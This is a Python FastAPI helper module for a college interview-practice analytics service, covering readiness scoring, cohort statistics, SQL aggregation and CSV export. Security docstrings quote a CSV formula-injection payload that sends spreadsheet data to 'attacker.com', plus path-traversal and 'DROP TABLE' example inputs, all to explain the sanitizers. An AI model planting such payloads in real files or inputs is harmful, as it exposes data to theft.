"""
PrepVista AI - Org College Helpers
"""

from __future__ import annotations

import csv
import io
import json
import math
import re
import statistics as _stats
import uuid
from datetime import datetime, timezone
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Query, UploadFile, File
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, field_validator

from app.config import (
    COLLEGE_STUDENT_PLAN, ORG_DEFAULT_PAGE_SIZE, ORG_MAX_PAGE_SIZE,
)
from app.database.connection import DatabaseConnection
from app.dependencies import OrgAdminProfile, require_org_admin

router = APIRouter()


# ══════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ══════════════════════════════════════════════════════════════════════════════

# ── Field length constants ────────────────────────────
# ✅ SEC: All user-controlled string fields capped. Without caps, a 1 MB notes
# field inflates DB storage and can trigger OOM in JSON serialization under load.
_MAX_EMAIL_LEN  = 254         # RFC 5321 maximum
_MAX_NAME_LEN   = 200
_MAX_CODE_LEN   = 64
_MAX_NOTES_LEN  = 1000
_MAX_SEARCH_LEN = 200
_EMAIL_RE = re.compile(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$')

# ── Canonical rubric categories ───────────────────────
# All 14 PrepVista evaluation rubric categories in canonical order.
# This list is the single source of truth driving all aggregation, export
# columns, and viz-shape construction in this file. Change here → propagates
# everywhere automatically.
_RUBRIC_CATEGORIES: list[str] = [
    "communication",
    "technical_depth",
    "problem_solving",
    "confidence",
    "structure_star",
    "vocabulary",
    "vocal_delivery",
    "leadership",
    "teamwork",
    "adaptability",
    "reasoning",
    "conciseness",
    "professionalism",
    "role_fit",
]

# ── Answer quality flag keys ──────────────────────────
# 9 answer-quality pattern flags stored in interview_sessions.quality_flags (JSONB).
# Boolean flags: values stored as JSON booleans true/false.
# Numeric flags: values stored as JSON numbers (0–1 or 0–100 scale).
_QUALITY_FLAG_BOOL: list[str] = [
    "star_usage", "evasiveness", "leadership_signals", "example_usage",
]
_QUALITY_FLAG_NUMERIC: list[str] = [
    "filler_ratio", "tone_positivity", "specificity",
    "confidence_markers", "technical_accuracy",
]

# ── Readiness tier labels ─────────────────────────────
_TIER_READY        = "ready"         # avg ≥ 75 AND sessions ≥ 3
_TIER_ALMOST_READY = "almost_ready"  # avg ≥ 60 AND sessions ≥ 2
_TIER_DEVELOPING   = "developing"    # avg ≥ 40 OR  sessions ≥ 1
_TIER_AT_RISK      = "at_risk"       # everything else (0 sessions or very low score)

# ── Numeric thresholds ────────────────────────────────
_READINESS_TARGET       = 75.0   # score required for "placement-ready" classification
_ZERO_OFFER_SCORE_HARD  = 40.0   # unconditionally at risk below this score
_ZERO_OFFER_SCORE_SOFT  = 50.0   # at risk if ≥ 3 sessions and still below this
_ZERO_OFFER_SLOPE_FLOOR = -2.0   # at risk if OLS slope (pts/session) is below this
_STUCK_MIN_SESSIONS     = 3      # minimum sessions before a student can be "stuck"
_STUCK_SLOPE_THRESHOLD  = 0.5    # slope ≤ this → flat/declining → stuck
_DIST_BUCKETS           = 10     # score-distribution bins: 0–10, 10–20, …, 90–100


# ══════════════════════════════════════════════════════════════════════════════
# SECURITY HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _validate_uuid(value: str, label: str = "ID") -> str:
    """Validate that a path parameter is a valid UUID.

    ✅ SEC: Without this, a non-UUID path param (e.g. '../../../etc/passwd' or
    'DROP TABLE') causes asyncpg to raise a raw PostgreSQL error that leaks
    internal schema details in the 500 response body. Validate first, return
    400 with a safe message — never let DB errors reach the client.
    """
    try:
        uuid.UUID(str(value))
        return str(value)
    except ValueError:
        raise HTTPException(400, f"Invalid {label} format.")


# ── CSV formula injection sanitizer ──────────────────
_CSV_INJECTION_PREFIXES = ('=', '+', '-', '@', '\t', '\r', '\n')


def _sanitize_csv_cell(value: object) -> str:
    """Sanitize a value before writing it to a CSV cell.

    ✅ SEC: CSV formula injection (A1 injection) is a real CVE category.
    A student named '=HYPERLINK(\"http://attacker.com/\"&A1,\"Click\")' causes
    Excel/Google Sheets to exfiltrate data when the college TPO opens the file.
    OWASP classifies this as high-severity for data export endpoints.

    Mitigation: prefix any cell starting with a formula trigger character
    with a single quote — Excel treats it as a text literal, not a formula.
    This is the OWASP-recommended defence.
    """
    if value is None:
        return ""
    text = str(value).strip()
    if text and text[0] in _CSV_INJECTION_PREFIXES:
        return "'" + text  # force Excel to treat as text literal
    return text


# ══════════════════════════════════════════════════════════════════════════════
# STATISTICAL COMPUTATION HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _compute_slope(scores: list[float]) -> float | None:
    """Compute OLS linear regression slope over an ordered score sequence.

    Formula (ordinary least squares, closed form):
      x_i  = session index (0, 1, …, N−1)
      x̄    = (N−1) / 2
      ȳ    = mean(scores)
      slope = Σ[(x_i − x̄)(y_i − ȳ)] / Σ[(x_i − x̄)²]

    Unit: score-points per session (positive → improving, negative → declining).
    Returns None for N < 2 (slope undefined for a single data point).
    Returns 0.0 if Σ(x_i−x̄)² == 0 (degenerate; impossible in practice since
      x_i are distinct integers, but guarded for numeric safety).
    """
    n = len(scores)
    if n < 2:
        return None
    x_mean = (n - 1) / 2.0
    y_mean = sum(scores) / n
    numerator   = sum((i - x_mean) * (scores[i] - y_mean) for i in range(n))
    denominator = sum((i - x_mean) ** 2                   for i in range(n))
    if denominator == 0.0:
        return 0.0
    return round(numerator / denominator, 3)


def _readiness_tier(avg_score: float | None, total_sessions: int) -> str:
    """Classify a student into one of four readiness tiers (top-down, first match).

    ready:        avg_score ≥ 75  AND sessions ≥ 3  — placement-ready now
    almost_ready: avg_score ≥ 60  AND sessions ≥ 2  — 1–2 sessions away
    developing:   avg_score ≥ 40  OR  sessions ≥ 1  — active but not ready
    at_risk:      everything else (zero sessions or very low score)
    """
    if avg_score is None or total_sessions == 0:
        return _TIER_AT_RISK
    if avg_score >= 75.0 and total_sessions >= 3:
        return _TIER_READY
    if avg_score >= 60.0 and total_sessions >= 2:
        return _TIER_ALMOST_READY
    if avg_score >= 40.0 or total_sessions >= 1:
        return _TIER_DEVELOPING
    return _TIER_AT_RISK


def _zero_offer_risk(
    avg_score: float | None,
    total_sessions: int,
    trend_slope: float | None,
) -> bool:
    """Return True if the student is at risk of receiving zero placement offers.

    Risk conditions (OR logic — any single condition triggers the flag):
      1. Zero sessions (never practiced at all).
      2. avg_score < 40 — hard floor; performance fundamentally insufficient.
      3. avg_score < 50 with ≥ 3 sessions — not improving despite sustained practice.
      4. trend_slope < −2.0 — actively declining ≥ 2 pts/session.
    """
    if total_sessions == 0:
        return True
    if avg_score is None:
        return True
    if avg_score < _ZERO_OFFER_SCORE_HARD:
        return True
    if total_sessions >= 3 and avg_score < _ZERO_OFFER_SCORE_SOFT:
        return True
    if trend_slope is not None and trend_slope < _ZERO_OFFER_SLOPE_FLOOR:
        return True
    return False


def _is_stuck(total_sessions: int, trend_slope: float | None) -> bool:
    """Return True if the student is practicing but not improving.

    'Stuck' = sessions ≥ 3 (demonstrated effort) AND slope ≤ +0.5 pts/session
    (flat or declining trajectory). These students need a training-method change,
    not just more reps.
    """
    if total_sessions < _STUCK_MIN_SESSIONS:
        return False
    if trend_slope is None:
        return False
    return trend_slope <= _STUCK_SLOPE_THRESHOLD


def _compute_percentile(score: float, all_scores: list[float]) -> float:
    """Compute cohort percentile rank [0–100] for one score within a population.

    Formula (inclusive rank method):
      percentile = (count of cohort scores ≤ this score) / N × 100

    Edge: N ≤ 1 → 50.0 (no meaningful comparison possible; neutral midpoint).
    """
    n = len(all_scores)
    if n <= 1:
        return 50.0
    rank = sum(1 for s in all_scores if s <= score)
    return round((rank / n) * 100.0, 1)


def _build_score_distribution(scores: list[float]) -> list[dict]:
    """Bucket a list of scores into _DIST_BUCKETS equal-width bins over [0, 100].

    Each bin spans 10 points: 0–10, 10–20, …, 90–100.
    The last bin uses ≤ 100 (not < 100) to include a perfect score.
    Empty input → all-zero buckets (frontend renders safely without null guards).
    """
    bucket_size = 100.0 / _DIST_BUCKETS
    result = []
    for i in range(_DIST_BUCKETS):
        lo = i * bucket_size
        hi = (i + 1) * bucket_size
        if i < _DIST_BUCKETS - 1:
            count = sum(1 for s in scores if lo <= s < hi)
        else:
            count = sum(1 for s in scores if lo <= s <= hi)  # last bin captures 100.0
        result.append({"range": f"{int(lo)}-{int(hi)}", "lo": lo, "hi": hi, "count": count})
    return result


def _time_to_threshold(
    current_avg: float | None,
    trend_slope: float | None,
    target: float = _READINESS_TARGET,
) -> int | None:
    """Estimate sessions needed to reach `target` score at the current trajectory.

    Formula: sessions_needed = ⌈(target − current_avg) / slope⌉

    Returns 0    if current_avg ≥ target (already placement-ready).
    Returns None if slope ≤ 0 (not progressing; no finite ETA).
    Returns None if either argument is None (insufficient data).
    """
    if current_avg is None or trend_slope is None or trend_slope <= 0:
        return None
    if current_avg >= target:
        return 0
    return math.ceil((target - current_avg) / trend_slope)


def _safe_round(value: Any, decimals: int = 1) -> float | None:
    """Round a nullable numeric, returning None if value is None or non-numeric."""
    if value is None:
        return None
    try:
        return round(float(value), decimals)
    except (TypeError, ValueError):
        return None


def _extract_cat_scores(row: Any, prefix: str = "avg_") -> dict[str, float | None]:
    """Extract per-category average scores from an asyncpg Record or dict.

    Expects column names: avg_communication, avg_technical_depth, … (all 14).
    Returns {category_name: rounded_float | None} for all _RUBRIC_CATEGORIES.
    """
    return {cat: _safe_round(row[f"{prefix}{cat}"]) for cat in _RUBRIC_CATEGORIES}


def _cohort_category_averages(
    per_student_cat_scores: list[dict[str, float | None]],
) -> dict[str, float | None]:
    """Average per-student category score dicts into cohort-level means.

    Excludes None values from each category's average (NULL = no data for that
    student in that category, not zero — preserves statistical correctness).
    Returns {category_name: cohort_avg | None}.
    """
    result: dict[str, float | None] = {}
    for cat in _RUBRIC_CATEGORIES:
        vals = [d[cat] for d in per_student_cat_scores if d.get(cat) is not None]
        result[cat] = _safe_round(_stats.mean(vals)) if vals else None
    return result


def _sorted_categories(
    cat_avgs: dict[str, float | None],
    ascending: bool = True,
) -> list[dict]:
    """Sort categories by average score, NULLs always last.

    Returns [{name: str, avg_score: float | None}].
    ascending=True (default) → weakest first, useful for gap identification.
    """
    with_data    = [(c, cat_avgs[c]) for c in _RUBRIC_CATEGORIES if cat_avgs.get(c) is not None]
    without_data = [(c, None)        for c in _RUBRIC_CATEGORIES if cat_avgs.get(c) is None]
    with_data.sort(key=lambda x: x[1], reverse=(not ascending))  # type: ignore[arg-type]
    return [{"name": c, "avg_score": v} for c, v in with_data + without_data]


def _build_radar_shape(
    cohort_cat_avgs: dict[str, float | None],
    top_quartile_cat_avgs: dict[str, float | None],
) -> dict:
    """Build the radar polygon JSON shape consumed by the frontend chart.

    Both series use the same canonical category order (_RUBRIC_CATEGORIES) so
    the frontend can zip them without re-sorting.
    """
    return {
        "categories":       _RUBRIC_CATEGORIES,
        "cohort_avg":       [cohort_cat_avgs.get(c) for c in _RUBRIC_CATEGORIES],
        "top_quartile_avg": [top_quartile_cat_avgs.get(c) for c in _RUBRIC_CATEGORIES],
    }


def _build_diverging_bar(
    cohort_cat_avgs: dict[str, float | None],
    global_avg: float | None,
) -> list[dict]:
    """Build the diverging bar JSON shape (above / below cohort overall average).

    deviation = category_avg − global_avg
    Positive → strength (above average); negative → weakness (below average).
    Returns sorted strongest → weakest (descending deviation), NULLs last.
    """
    bars = []
    for cat in _RUBRIC_CATEGORIES:
        cat_avg = cohort_cat_avgs.get(cat)
        deviation = _safe_round(
            (cat_avg - global_avg)
            if (cat_avg is not None and global_avg is not None)
            else None
        )
        bars.append({"name": cat, "cohort_avg": cat_avg, "deviation": deviation})
    bars.sort(key=lambda x: (x["deviation"] is None, -(x["deviation"] or 0)))
    return bars


def _build_dept_comparison(perf_rows: list[Any]) -> list[dict]:
    """Group per-student perf rows by department and compute dept-level aggregates.

    Returns [{department_name, student_count, sessions_per_student, avg_score,
              category_scores: {cat: float | None}}] sorted by avg_score DESC.
    Students with no department are grouped under 'Unassigned'.
    """
    dept_map: dict[str, list[Any]] = {}
    for r in perf_rows:
        dept_key = r["department_name"] or "Unassigned"
        dept_map.setdefault(dept_key, []).append(r)

    result = []
    for dept_name, rows in dept_map.items():
        scored         = [r for r in rows if r["avg_score"] is not None]
        session_counts = [int(r["session_count"] or 0) for r in rows]
        total_sessions = sum(session_counts)
        student_count  = len(rows)
        dept_cat_avgs  = _cohort_category_averages([_extract_cat_scores(r) for r in rows])
        dept_avg       = _safe_round(_stats.mean([float(r["avg_score"]) for r in scored])) if scored else None
        result.append({
            "department_name":      dept_name,
            "student_count":        student_count,
            "sessions_per_student": _safe_round(total_sessions / student_count) if student_count else 0.0,
            "avg_score":            dept_avg,
            "category_scores":      dept_cat_avgs,
        })
    result.sort(key=lambda x: (x["avg_score"] is None, -(x["avg_score"] or 0)))
    return result


def _build_traffic_light(tier_counts: dict[str, int], total: int) -> dict:
    """Build traffic-light readiness grid JSON shape (counts + percentages)."""
    def _pct(n: int) -> float:
        return round(n / total * 100, 1) if total > 0 else 0.0

    return {
        _TIER_READY:        {"count": tier_counts.get(_TIER_READY, 0),        "pct": _pct(tier_counts.get(_TIER_READY, 0))},
        _TIER_ALMOST_READY: {"count": tier_counts.get(_TIER_ALMOST_READY, 0), "pct": _pct(tier_counts.get(_TIER_ALMOST_READY, 0))},
        _TIER_DEVELOPING:   {"count": tier_counts.get(_TIER_DEVELOPING, 0),   "pct": _pct(tier_counts.get(_TIER_DEVELOPING, 0))},
        _TIER_AT_RISK:      {"count": tier_counts.get(_TIER_AT_RISK, 0),      "pct": _pct(tier_counts.get(_TIER_AT_RISK, 0))},
    }


def _build_answer_flag_aggregates(perf_rows: list[Any]) -> dict:
    """Compute cohort-level answer quality flag stats from per-student aggregate rows.

    Boolean flags  → pct of students where flag fired in ≥ 1 session.
    Numeric flags  → mean of per-student averages, excluding NULLs.
    """
    scored_students = [r for r in perf_rows if int(r["session_count"] or 0) > 0]
    n = len(scored_students) or 1  # avoid /0

    result: dict[str, Any] = {}

    # Boolean flags: star_usage, evasiveness, leadership_signals, example_usage
    for flag in _QUALITY_FLAG_BOOL:
        count_col = f"{flag}_count"
        flagged   = sum(1 for r in scored_students if int(r.get(count_col) or 0) > 0)
        result[f"{flag}_pct"] = round(flagged / n * 100, 1)

    # Numeric flags: filler_ratio, tone_positivity, specificity,
    # confidence_markers, technical_accuracy
    for flag in _QUALITY_FLAG_NUMERIC:
        avg_col = f"avg_{flag}"
        vals    = [float(r[avg_col]) for r in scored_students if r.get(avg_col) is not None]
        result[f"{flag}_avg"] = _safe_round(_stats.mean(vals), 3) if vals else None

    return result


# ══════════════════════════════════════════════════════════════════════════════
# QUERY HELPERS  (reused across analytics, growth, readiness, and export)
# ══════════════════════════════════════════════════════════════════════════════

def _segment_filter_clause(
    department_id: str | None,
    year_id:       str | None,
    batch_id:      str | None,
    start_idx:     int,
    alias:         str = "os",
) -> tuple[str, list, int]:
    """Build parameterized WHERE-clause additions for segment filters.

    Returns (extra_sql, extra_params, next_param_idx).
    extra_sql is zero or more "AND alias.col = $N" clauses ready to append
    to an existing WHERE block. Follows the same f-string pattern used
    throughout this file for safe query building.
    """
    parts:  list[str] = []
    params: list      = []
    idx = start_idx
    if department_id:
        idx += 1; parts.append(f"{alias}.department_id = ${idx}"); params.append(department_id)
    if year_id:
        idx += 1; parts.append(f"{alias}.year_id = ${idx}");       params.append(year_id)
    if batch_id:
        idx += 1; parts.append(f"{alias}.batch_id = ${idx}");      params.append(batch_id)
    clause = (" AND " + " AND ".join(parts)) if parts else ""
    return clause, params, idx


async def _fetch_perf_aggregate(
    conn,
    org_id: str,
    extra_clause: str = "",
    extra_params: list | None = None,
) -> list:
    """Fetch one aggregated row per active student with all 14 category averages,
    session counts, quality flag aggregates, and identity fields.

    ASSUMPTION: interview_sessions.rubric_scores is a JSONB column with keys
      matching _RUBRIC_CATEGORIES exactly (e.g. "structure_star" not "structure/star").
    ASSUMPTION: interview_sessions.quality_flags is a JSONB column with boolean
      and numeric keys matching _QUALITY_FLAG_BOOL + _QUALITY_FLAG_NUMERIC.
    ASSUMPTION: interview_sessions.state = 'FINISHED' marks a finished session.

    Single JOIN strategy: O(students + sessions) — no per-student sub-selects,
    no N+1. The FILTER (WHERE state = 'FINISHED') aggregate syntax is standard
    PostgreSQL and handled correctly by asyncpg.
    """
    params: list = [org_id] + (extra_params or [])
    rows = await conn.fetch(
        f"""
        SELECT
            os.user_id,
            os.department_id,
            os.year_id,
            os.batch_id,
            os.student_code,
            p.full_name,
            p.email,
            cd.department_name,
            cy.year_name,
            cb.batch_name,
            -- Session counts
            COUNT(isess.id) FILTER (WHERE isess.state = 'FINISHED')
                AS session_count,
            -- Overall score aggregates
            ROUND(AVG(isess.final_score)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)
                AS avg_score,
            MAX(isess.final_score) FILTER (WHERE isess.state = 'FINISHED')
                AS best_score,
            -- First and latest overall scores (for delta computation in Python)
            (ARRAY_AGG(isess.final_score ORDER BY isess.created_at ASC)
             FILTER (WHERE isess.state = 'FINISHED'))[1]
                AS first_score,
            (ARRAY_AGG(isess.final_score ORDER BY isess.created_at DESC)
             FILTER (WHERE isess.state = 'FINISHED'))[1]
                AS latest_score,
            -- 14 rubric category averages via JSONB key extraction + numeric cast
            ROUND(AVG((isess.rubric_scores->>'communication')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_communication,
            ROUND(AVG((isess.rubric_scores->>'technical_depth')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_technical_depth,
            ROUND(AVG((isess.rubric_scores->>'problem_solving')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_problem_solving,
            ROUND(AVG((isess.rubric_scores->>'confidence')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_confidence,
            ROUND(AVG((isess.rubric_scores->>'structure_star')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_structure_star,
            ROUND(AVG((isess.rubric_scores->>'vocabulary')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_vocabulary,
            ROUND(AVG((isess.rubric_scores->>'vocal_delivery')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_vocal_delivery,
            ROUND(AVG((isess.rubric_scores->>'leadership')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_leadership,
            ROUND(AVG((isess.rubric_scores->>'teamwork')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_teamwork,
            ROUND(AVG((isess.rubric_scores->>'adaptability')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_adaptability,
            ROUND(AVG((isess.rubric_scores->>'reasoning')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_reasoning,
            ROUND(AVG((isess.rubric_scores->>'conciseness')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_conciseness,
            ROUND(AVG((isess.rubric_scores->>'professionalism')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_professionalism,
            ROUND(AVG((isess.rubric_scores->>'role_fit')::numeric)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_role_fit,
            -- Quality flag aggregates
            ROUND(AVG(aqf.filler_word_ratio)
                  FILTER (WHERE isess.state = 'FINISHED'), 3)  AS avg_filler_ratio,
            ROUND(AVG(aqf.tone_score)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_tone_positivity,
            ROUND(AVG(aqf.answer_completeness_ratio)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_specificity,
            ROUND(AVG(aqf.confidence_signal_score)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_confidence_markers,
            ROUND(AVG(aqf.grammar_score)
                  FILTER (WHERE isess.state = 'FINISHED'), 1)  AS avg_technical_accuracy,
            COUNT(isess.id) FILTER (WHERE isess.state = 'FINISHED'
                AND aqf.star_usage_score >= 5.0)
                AS star_usage_count,
            COUNT(isess.id) FILTER (WHERE isess.state = 'FINISHED'
                AND aqf.evasiveness_score >= 5.0)
                AS evasiveness_count,
            COUNT(isess.id) FILTER (WHERE isess.state = 'FINISHED'
                AND aqf.vocabulary_richness >= 0.5)
                AS leadership_signals_count,
            COUNT(isess.id) FILTER (WHERE isess.state = 'FINISHED'
                AND aqf.repetition_ratio <= 0.2)
                AS example_usage_count
        FROM organization_students os
        JOIN   profiles             p    ON p.id    = os.user_id
        LEFT JOIN college_departments cd ON cd.id   = os.department_id
        LEFT JOIN college_years       cy ON cy.id   = os.year_id
        LEFT JOIN college_batches     cb ON cb.id   = os.batch_id
        LEFT JOIN interview_sessions  isess ON isess.user_id = os.user_id
        LEFT JOIN answer_quality_flags aqf ON aqf.session_id = isess.id
        WHERE os.organization_id = $1
          AND os.status = 'active'
          {extra_clause}
        GROUP BY os.user_id, os.department_id, os.year_id, os.batch_id,
                 os.student_code, p.full_name, p.email,
                 cd.department_name, cy.year_name, cb.batch_name
        ORDER BY p.full_name
        """,
        *params,
    )
    return rows


async def _fetch_session_series(
    conn,
    org_id: str,
    extra_clause: str = "",
    extra_params: list | None = None,
) -> list:
    """Fetch every completed session for all active org students, ordered chronologically.

    Returns one row per session: user_id, final_score, created_at, rubric_scores.
    Used to compute OLS slopes, growth deltas, and category-level trends in Python.
    ORDER BY (user_id, created_at) is essential for correct slope computation.
    """
    params: list = [org_id] + (extra_params or [])
    rows = await conn.fetch(
        f"""
        SELECT
            os.user_id,
            isess.final_score,
            isess.created_at,
            isess.rubric_scores
        FROM organization_students os
        JOIN interview_sessions isess ON isess.user_id = os.user_id
                                     AND isess.state = 'FINISHED'
        WHERE os.organization_id = $1
          AND os.status = 'active'
          {extra_clause}
        ORDER BY os.user_id, isess.created_at ASC
        """,
        *params,
    )
    return rows


def _compute_student_growth_map(series_rows: list[Any]) -> dict[str, dict]:
    """Group session series rows by user_id and compute growth metrics per student.

    Returns {user_id_str: {
        scores: [float],               # overall final scores in chronological order
        first_score: float | None,
        latest_score: float | None,
        overall_delta: float | None,   # latest − first
        trend_slope: float | None,     # OLS slope in pts/session
        is_stuck: bool,
        time_to_threshold: int | None, # sessions needed to reach score 75
        category_series: {cat: [float]},
        category_deltas: {cat: float | None},
        category_slopes: {cat: float | None},
    }}.
    Handles null rubric_scores gracefully (missing data → None for that category).
    Single-pass group-by: O(total_sessions).
    """
    grouped: dict[str, list[Any]] = {}
    for row in series_rows:
        uid = str(row["user_id"])
        grouped.setdefault(uid, []).append(row)

    result: dict[str, dict] = {}
    for uid, sessions in grouped.items():
        # Overall score series (guard against NULL final_score)
        scores = [float(s["final_score"]) for s in sessions if s["final_score"] is not None]
        first   = scores[0]  if scores else None
        latest  = scores[-1] if scores else None
        delta   = _safe_round(latest - first) if (first is not None and latest is not None) else None
        slope   = _compute_slope(scores)
        avg     = _safe_round(_stats.mean(scores)) if scores else None

        # Per-category series: extract from JSONB rubric_scores column
        cat_series: dict[str, list[float]] = {cat: [] for cat in _RUBRIC_CATEGORIES}
        for s in sessions:
            rs = s["rubric_scores"]
            if rs is None:
                continue
            for cat in _RUBRIC_CATEGORIES:
                try:
                    v = rs.get(cat) if hasattr(rs, "get") else None
                    if v is not None:
                        cat_series[cat].append(float(v))
                except (TypeError, ValueError):
                    pass

        cat_deltas: dict[str, float | None] = {}
        cat_slopes: dict[str, float | None] = {}
        for cat in _RUBRIC_CATEGORIES:
            vals = cat_series[cat]
            cat_deltas[cat] = _safe_round(vals[-1] - vals[0]) if len(vals) >= 2 else None
            cat_slopes[cat] = _compute_slope(vals)

        result[uid] = {
            "scores":            scores,
            "first_score":       first,
            "latest_score":      latest,
            "overall_delta":     delta,
            "trend_slope":       slope,
            "is_stuck":          _is_stuck(len(scores), slope),
            "time_to_threshold": _time_to_threshold(avg, slope),
            "category_series":   cat_series,
            "category_deltas":   cat_deltas,
            "category_slopes":   cat_slopes,
        }
    return result


# ══════════════════════════════════════════════════════════════════════════════
# ROUTING UTILITIES
# ══════════════════════════════════════════════════════════════════════════════

def _paginate(page: int, page_size: int) -> tuple[int, int]:
    ps     = min(max(1, page_size), ORG_MAX_PAGE_SIZE)
    offset = max(0, (max(1, page) - 1) * ps)
    return ps, offset


async def _log_action(
    conn, org_id, admin_id, action, *,
    student_id=None, entity_type=None, entity_id=None, notes=None, metadata=None,
):
    """Write an audit log entry that never blocks or fails the calling operation.

    ✅ FIXED: Wrapped in try/except — previously an audit log INSERT failure
    would propagate up and roll back the actual operation (add_student, etc.).
    The audit log must never block or undo a real business action.
    """
    try:
        await conn.execute(
            """INSERT INTO organization_access_log
               (organization_id, admin_user_id, student_user_id, action,
                entity_type, entity_id, notes, metadata)
               VALUES ($1,$2,$3,$4,$5,$6,$7,$8)""",
            org_id, admin_id, student_id, action, entity_type, entity_id, notes,
            json.dumps(metadata) if metadata else "{}",
        )
    except Exception:
        pass  # Swallow silently — audit failure must never affect the user-facing response


# ══════════════════════════════════════════════════════════════════════════════
# DASHBOARD  (extended: lightweight performance_summary block added)
# ══════════════════════════════════════════════════════════════════════════════

def _render_cohort_summary_export(
    perf_rows: list[Any],
    export_format: str,
    org_id: str,
) -> Any:
    """Build a cohort-level aggregate export: one row per department + one per batch.

    Designed for NAAC/NIRF/management reporting. Each row contains:
      student count, session count, sessions/student, avg overall score,
      all 14 rubric category averages, tier distribution counts + ready %,
      zero-offer risk count.

    Pure Python-side computation from the perf_rows already in memory.
    Zero additional DB queries.
    """
    dept_map: dict[str, list[Any]] = {}
    batch_map: dict[str, list[Any]] = {}
    for r in perf_rows:
        dept_map.setdefault(r["department_name"] or "Unassigned", []).append(r)
        batch_map.setdefault(r["batch_name"]      or "Unassigned", []).append(r)

    def _segment_summary(name: str, seg_type: str, rows: list[Any]) -> dict:
        sc_list    = [int(r["session_count"] or 0) for r in rows]
        avg_list   = [float(r["avg_score"]) for r in rows if r["avg_score"] is not None]
        total_stu  = len(rows)
        total_sess = sum(sc_list)
        tc: dict[str, int] = {
            _TIER_READY: 0, _TIER_ALMOST_READY: 0, _TIER_DEVELOPING: 0, _TIER_AT_RISK: 0,
        }
        zero_risk_count = 0
        for r in rows:
            sc  = int(r["session_count"] or 0)
            avg = _safe_round(r["avg_score"])
            tc[_readiness_tier(avg, sc)] = tc.get(_readiness_tier(avg, sc), 0) + 1
            if _zero_offer_risk(avg, sc, None):
                zero_risk_count += 1
        cat_avgs = _cohort_category_averages([_extract_cat_scores(r) for r in rows])
        seg_avg  = _safe_round(_stats.mean(avg_list)) if avg_list else None
        return {
            "segment_type":          seg_type,
            "segment_name":          name,
            "student_count":         total_stu,
            "total_sessions":        total_sess,
            "sessions_per_student":  _safe_round(total_sess / total_stu) if total_stu else 0.0,
            "avg_score":             seg_avg,
            "ready_count":           tc[_TIER_READY],
            "almost_ready_count":    tc[_TIER_ALMOST_READY],
            "developing_count":      tc[_TIER_DEVELOPING],
            "at_risk_count":         tc[_TIER_AT_RISK],
            "zero_offer_risk_count": zero_risk_count,
            "ready_pct":             round(tc[_TIER_READY] / total_stu * 100, 1) if total_stu else 0.0,
            **{f"avg_{cat}": cat_avgs.get(cat) for cat in _RUBRIC_CATEGORIES},
        }

    segments = (
        [_segment_summary(name, "department", rows) for name, rows in sorted(dept_map.items())] +
        [_segment_summary(name, "batch",      rows) for name, rows in sorted(batch_map.items())]
    )

    if export_format == "csv":
        output = io.StringIO()
        writer = csv.writer(output)
        cat_headers = [f"Avg {cat.replace('_', ' ').title()}" for cat in _RUBRIC_CATEGORIES]
        writer.writerow([
            "Segment Type", "Segment Name", "Student Count", "Total Sessions",
            "Sessions / Student", "Avg Overall Score",
            "Ready Count", "Almost Ready Count", "Developing Count", "At Risk Count",
            "Zero Offer Risk Count", "Ready %",
            *cat_headers,
        ])
        for seg in segments:
            writer.writerow([
                _sanitize_csv_cell(seg["segment_type"]),
                _sanitize_csv_cell(seg["segment_name"]),
                seg["student_count"],
                seg["total_sessions"],
                _sanitize_csv_cell(seg["sessions_per_student"]),
                _sanitize_csv_cell(seg["avg_score"]),
                seg["ready_count"],
                seg["almost_ready_count"],
                seg["developing_count"],
                seg["at_risk_count"],
                seg["zero_offer_risk_count"],
                _sanitize_csv_cell(seg["ready_pct"]),
                *[_sanitize_csv_cell(seg[f"avg_{cat}"]) for cat in _RUBRIC_CATEGORIES],
            ])
        output.seek(0)
        return StreamingResponse(
            io.BytesIO(output.getvalue().encode("utf-8")),
            media_type="text/csv",
            headers={"Content-Disposition": f"attachment; filename=cohort_report_{org_id[:8]}.csv"},
        )

    return {"segments": segments, "total_segments": len(segments)}


# ══════════════════════════════════════════════════════════════════════════════
# REPORTS / EXPORT  (extended: +26 columns + new cohort_summary export type)
# ══════════════════════════════════════════════════════════════════════════════
